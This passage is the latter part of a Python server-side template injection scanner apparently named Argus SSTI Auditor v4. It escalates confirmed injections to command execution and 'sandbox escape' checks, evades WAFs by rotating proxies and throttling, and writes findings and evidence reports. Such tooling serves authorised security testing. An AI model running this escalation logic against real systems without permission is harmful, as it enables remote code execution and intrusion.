                        time.sleep(REQUEST_SLEEP)
                        if resp is None or _looks_denied(resp):
                            continue
                        body = _body(resp)
                        new = _extract_proof_patterns(body) - baseline.preexisting_proof_patterns
                        if new:
                            sample = sorted(new)[0]
                            return [SSTIFinding(
                                target=surface["url"], param=surface["param"],
                                param_location=surface["location"],
                                technique="proof", severity=Severity.CRITICAL,
                                confidence=98, confirmed=True,
                                engine=concrete_engine, payload=p,
                                http_status=resp.status_code,
                                evidence=f"Sandbox escape confirmed: '{cmd}' → '{sample}'",
                                bypass_used=f"subclasses_index_{idx}",
                                details={"command": cmd, "engine": concrete_engine,
                                         "index": idx,
                                         "matched_patterns": sorted(new),
                                         "body_snippet": body[:400]},
                            )]
                    continue

                payload = template.format(cmd=cmd)
                resp = _probe(session, surface, payload)
                time.sleep(REQUEST_SLEEP)
                if resp is None or _looks_denied(resp):
                    continue
                body = _body(resp)
                new = _extract_proof_patterns(body) - baseline.preexisting_proof_patterns
                if not new:
                    continue
                sample = sorted(new)[0]
                return [SSTIFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="proof", severity=Severity.CRITICAL, confidence=98,
                    confirmed=True, engine=concrete_engine, payload=payload,
                    http_status=resp.status_code,
                    evidence=f"Command output confirmed: '{cmd}' → '{sample}'",
                    details={"command": cmd, "engine": concrete_engine,
                             "matched_patterns": sorted(new),
                             "body_snippet": body[:400]},
                )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: EvasionSession, surface: dict,
    *,
    test_blind_enabled: bool = True,
    test_escalation_enabled: bool = True,
    aggressive: bool = False,
) -> tuple[Baseline, list[SSTIFinding], str]:
    baseline = build_baseline(session, surface)
    findings: list[SSTIFinding] = []

    poly = test_polyglot(session, surface, baseline)
    findings.extend(poly)

    engine = poly[0].engine if poly and poly[0].engine else ""
    if not engine:
        engine = fingerprint_engine(session, surface)

    if test_blind_enabled and not any(f.confirmed for f in poly):
        blind = test_blind(session, surface, baseline, engine)
        findings.extend(blind)
        if blind and not engine:
            engine = blind[0].engine

    if test_escalation_enabled and engine and any(f.confirmed for f in findings):
        proof = test_escalation(session, surface, baseline, engine, aggressive)
        findings.extend(proof)

    return baseline, findings, engine


# ═════════════════════════════════════════════════════════════════════════════
#  EVIDENCE PRESERVATION
# ═════════════════════════════════════════════════════════════════════════════

def _save_evidence(finding: SSTIFinding, evidence_dir: Path) -> None:
    try:
        evidence_dir.mkdir(parents=True, exist_ok=True)
        base = finding.finding_hash[:16]
        (evidence_dir / f"{base}_evidence.txt").write_text(
            f"finding_hash: {finding.finding_hash}\n"
            f"target: {finding.target}\n"
            f"param: {finding.param} ({finding.param_location})\n"
            f"technique: {finding.technique}\n"
            f"severity: {finding.severity.value}\n"
            f"engine: {finding.engine}\n"
            f"payload: {finding.payload}\n"
            f"evidence: {finding.evidence}\n"
            f"details: {json.dumps(finding.details, indent=2)}\n"
        )
    except Exception as e:
        log.debug(f"evidence save failed: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[SSTIFinding]) -> None:
    if not findings or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    method = getattr(DB, "upsert_ssti_findings", None)
    if method is None:
        log.warning("  DB sync: db.py missing upsert_ssti_findings()")
        return
    try:
        result = method(scan_id, [f.to_dict() for f in findings])
        if result is not None:
            log.info(f"  DB sync: {result} SSTI finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_ssti_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    test_blind_enabled: bool = True,
    test_escalation_enabled: bool = True,
    aggressive: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()
    settings = _ssti_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
    eff_jitter  = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])

    urls = _load_urls(urls_file)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]
    outdir.mkdir(parents=True, exist_ok=True)
    evidence_dir = outdir / "ssti_evidence"

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))
    seen: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen:
            seen.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    log.info(f"  Config : rate={eff_rate}/s  jitter={eff_jitter}s  "
             f"concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe'}")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")
    log.info("")

    if not surfaces:
        log.warning("  No surfaces to test — writing empty report")
        return _write_empty(outdir, urls_file, start, total_input=len(urls))

    profile = EvasionProfile(
        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
    )
    all_findings: list[SSTIFinding] = []
    engine_map: dict[tuple[str, str, str], str] = {}
    results: list[dict] = []

    with EvasionSession(profile=profile, timeout=eff_timeout) as session:
        # Phase 0 — WAF detection (sample first 5 hosts)
        log.info("  Phase 0 — WAF detection")
        waf_by_host: dict[str, WAFReport] = {}
        seen_hosts: set[str] = set()
        for s in surfaces[:50]:
            host = urllib.parse.urlparse(s["url"]).hostname or ""
            if not host or host in seen_hosts:
                continue
            seen_hosts.add(host)
            waf = detect_waf(session, s["url"])
            waf_by_host[host] = waf
            if waf.vendor != "unknown":
                log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")

        if any(w.vendor != "unknown" for w in waf_by_host.values()):
            session.profile.rate_limit = max(0.5, eff_rate * 0.6)
            session.profile.jitter = max(eff_jitter, 0.8)

        def _process(surface: dict) -> tuple[dict, list[SSTIFinding], str]:
            try:
                baseline, findings, engine = audit_surface(
                    session, surface,
                    test_blind_enabled=test_blind_enabled,
                    test_escalation_enabled=test_escalation_enabled,
                    aggressive=aggressive,
                )
                host = urllib.parse.urlparse(surface["url"]).hostname or ""
                waf = waf_by_host.get(host, WAFReport())
                for f in findings:
                    f.waf_vendor = waf.vendor
                return {
                    "url": surface["url"], "param": surface["param"],
                    "location": surface["location"], "method": surface.get("method", "GET"),
                    "baseline": baseline.to_dict(), "engine": engine,
                    "finding_count": len(findings),
                }, findings, engine
            except Exception as e:
                log.debug(f"    error on {surface['url']}: {e}")
                return {
                    "url": surface["url"], "param": surface["param"],
                    "location": surface["location"], "error": str(e),
                }, [], ""

        log.info("")
        log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
            futures = {pool.submit(_process, s): s for s in surfaces}
            done = 0
            for fut in as_completed(futures):
                done += 1
                try:
                    result, findings, engine = fut.result()
                    results.append(result)
                    if engine:
                        engine_map[(result["url"], result["param"],
                                    result["location"])] = engine
                    if findings:
                        all_findings.extend(findings)
                        top = findings[0]
                        log.info(
                            f"    [{done:>3}/{len(surfaces)}] {top.technique:<10} "
                            f"{top.severity.value:<8} engine={engine or '?':<16} "
                            f"{result['url'][:40]} param={result['param']}"
                        )
                    elif done % 10 == 0:
                        log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
                except Exception as e:
                    log.debug(f"    future error: {e}")

    # Chains
    log.info("")
    log.info("  Chain aggregation")
    chains = build_chains(all_findings)
    log.info(f"    {len(chains)} chain(s)")

    # Dedupe
    seen_f: set[tuple] = set()
    deduped: list[SSTIFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen_f:
            seen_f.add(key)
            f.auth_enabled = auth_on
            if not f.first_seen:
                f.first_seen = _db_now()
            deduped.append(f)
    deduped.sort(key=lambda f: (
        -f.severity.rank, 0 if f.confirmed else 1, -f.confidence, f.target,
    ))

    # Reports
    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_technique: dict[str, int] = {}
    by_engine: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]
    for f in deduped:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.engine:
            by_engine[f.engine] = by_engine.get(f.engine, 0) + 1
        if f.confirmed:
            _save_evidence(f, evidence_dir)

    json_path = outdir / "ssti_findings.json"
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "aggressive": aggressive,
        "config": {
            "rate_limit": eff_rate, "jitter": eff_jitter,
            "concurrency": eff_conc, "timeout": eff_timeout,
            "blind": test_blind_enabled, "escalation": test_escalation_enabled,
            "proxies": len(eff_proxies),
        },
        "totals": {
            "urls_input": len(urls), "surfaces_tested": len(surfaces),
            "total_findings": len(deduped), "confirmed": len(confirmed_list),
            "critical": by_sev["CRITICAL"], "high": by_sev["HIGH"],
            "medium": by_sev["MEDIUM"], "low": by_sev["LOW"],
            "info": by_sev["INFO"],
        },
        "summary": {
            "by_severity": by_sev,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_engine": dict(sorted(by_engine.items(), key=lambda kv: -kv[1])),
        },
        "results": results,
        "findings": [f.to_dict() for f in deduped],
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # Confirmed-only
    confirmed_high = [f for f in deduped if f.severity.rank >= Severity.HIGH.rank]
    (outdir / "ssti_confirmed.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "input_file": str(urls_file),
            "totals": {
                "confirmed": len(confirmed_high),
                "critical": sum(1 for f in confirmed_high if f.severity == Severity.CRITICAL),
                "high": sum(1 for f in confirmed_high if f.severity == Severity.HIGH),
                "by_engine": dict(sorted(by_engine.items(), key=lambda kv: -kv[1])),
                "by_chain": {cid: sum(1 for f in confirmed_high if cid in f.chain_ids)
                             for cid in {x for f in confirmed_high for x in f.chain_ids}},
            },
            "findings": [f.to_dict() for f in confirmed_high],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Chains
    (outdir / "ssti_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Flat files
    (outdir / "ssti_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.severity.value}\t{f.confidence}\t"
            f"{f.engine}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    (outdir / "ssti_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.engine}\t{f.technique}\t{f.payload[:120]}"
            for f in confirmed_list
        ) + ("\n" if confirmed_list else "")
    )
    (outdir / "ssti_engine.txt").write_text(
        "\n".join(
            f"{url}\t{param}\t{engine}"
            for (url, param, _), engine in engine_map.items()
        ) + ("\n" if engine_map else "")
    )

    # DB sync
    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)

    # Console summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    ssti_findings.json           {len(deduped):>5} finding(s)")
    log.info(f"    ssti_confirmed.json          {len(confirmed_high):>5} confirmed (HIGH+)")
    log.info(f"    ssti_chains.json             {len(chains):>5} chain(s)")
    log.info(f"    ssti_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    ssti_confirmed.txt           {len(confirmed_list):>5} confirmed")
    log.info(f"    ssti_engine.txt              {len(engine_map):>5} fingerprint(s)")
    if confirmed_high:
        log.info(f"    ssti_evidence/               {len(confirmed_list):>5} evidence file(s)")
    log.info("")
    log.info(f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
             f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}")
    log.info(f"  Confirmed: {len(confirmed_list)}/{len(deduped)}")
    if chains:
        log.info("  Chains   : " + " · ".join(
            f"{c.chain_id}({c.severity.value})" for c in chains
        ))
    if confirmed_high:
        log.info("")
        log.info("  Confirmed SSTI findings:")
        for f in confirmed_high[:12]:
            tag = f" [{','.join(f.chain_ids)}]" if f.chain_ids else ""
            log.info(f"    [{f.severity.value:<8}] {f.engine or '?':<16} "
                     f"{f.technique:<10} {f.target[:50]}{tag}")
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": False, "aggressive": False, "config": {},
        "totals": {
            "urls_input": total_input, "surfaces_tested": 0,
            "total_findings": 0, "confirmed": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}, "by_engine": {}},
        "results": [], "findings": [],
    }
    path = outdir / "ssti_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    (outdir / "ssti_confirmed.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0,
                   "by_engine": {}, "by_chain": {}},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "ssti_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(), "chains": [],
    }, indent=2) + "\n")
    for n in ("ssti_candidates.txt", "ssti_confirmed.txt", "ssti_engine.txt"):
        (outdir / n).write_text("")
    (outdir / "ssti_evidence").mkdir(exist_ok=True)
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s",
                        handlers=[logging.StreamHandler(sys.stdout)])
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_ssti.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"

    parser = argparse.ArgumentParser(description="Argus SSTI Auditor v4")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--proxies", default=None)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--no-blind", action="store_true")
    parser.add_argument("--no-escalation", action="store_true")
    parser.add_argument("--aggressive", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=None)
    args = parser.parse_args()

    hdrs = {"Cookie": args.cookie} if args.cookie else None
    proxies = args.proxies.split(",") if args.proxies else None

    try:
        run_ssti_scan(
            args.input, args.output,
            headers=hdrs,
            test_blind_enabled=not args.no_blind,
            test_escalation_enabled=not args.no_escalation,
            aggressive=args.aggressive,
            max_surfaces=args.max_surfaces,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            timeout=args.timeout,
            proxies=proxies,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        import traceback; log.debug(traceback.format_exc()); sys.exit(1)
